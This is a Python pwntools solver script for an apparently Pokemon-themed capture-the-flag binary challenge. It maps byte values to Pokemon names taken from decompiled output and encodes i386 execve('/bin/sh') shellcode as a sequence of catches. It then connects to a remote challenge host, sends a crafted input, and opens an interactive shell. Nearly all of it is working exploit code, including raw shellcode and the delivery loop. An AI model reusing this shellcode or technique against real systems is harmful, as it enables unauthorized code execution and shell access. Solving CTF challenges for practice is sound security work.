from pwn import *
from pprint import pprint


with open('./poks.txt', 'r') as f:
    t = f.read().split('\n')
 
l = dict()

for i in t:
    if 'FUN_00011638' in i and not 'DAT' in i:
        p1 = i.find('FUN_00011638("') + len('FUN_00011638("')
        p2 = i.find('",')
        p3 = p2 + 2
        p4 = i.find(');')
        pokemon_name = i[p1:p2]
        pokemon_byte = i[p3:p4]
        if 'x' in pokemon_byte:
            pokemon_byte = int(pokemon_byte, 16)
        else:
            pokemon_byte = int(pokemon_byte)
        l[pokemon_byte] = pokemon_name

l[0x39] = 'abra'
l[0x50] = 'seel'
l[0x5f] = 'muk'
l[0x59] = 'onix'
l[0x7a] = 'jynx'
l[0x9a] = 'mew'
l[0xb7] = 'natu'
l[0xb4] = 'xatu'

buf =  b""
buf += b"\x31\xc9\xf7\xe1\xb0\x0b\x68\x2f\x73\x68\x00\x68"
buf += b"\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

context.arch = 'i386'
print(disasm(buf))

shellcode = list()

for i in buf:
    try:
        shellcode.append(l[i])
    except:
        print(f"NO: {i}")

pprint(shellcode)

p = remote('0.cloud.chals.io', 10898)
# p = process('./catch_them_all')
# gdb.attach(p, gdbscript='vmmap')
# print(p.recv().decode(errors='ignore'))
p.sendline(b'AAAABAAACAAADAAA\x07')
# 
i = 0
j = 0
while True:
    if i == len(shellcode):
        p.sendline(b'f')
        break
    resp = p.recv().decode(errors='ignore')
    if f"found {shellcode[i]}!" in resp:
        print(f"CATCH {j}: {shellcode[i]}")
        print(resp)
        p.sendline(b'y')
        i += 1
    else:
        p.sendline(b'n')
    j += 1

p.interactive()


# working on local
